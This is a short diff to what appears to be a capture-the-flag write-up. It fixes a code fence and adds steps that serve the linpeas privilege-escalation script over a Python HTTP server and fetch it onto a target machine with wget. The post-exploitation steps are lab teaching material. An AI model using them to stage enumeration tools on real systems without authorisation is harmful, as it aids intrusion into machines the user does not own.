@@ -343,4 +343,11 @@ Now,
 Send the file linpeas.sh to thetarget machine 
 
 ```
-```python3 -m http.server
+python3 -m http.server
+```
+
+![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260221124333.png)
+
+```
+wget 10.10.15.237:8000/linpeas.sh
+```
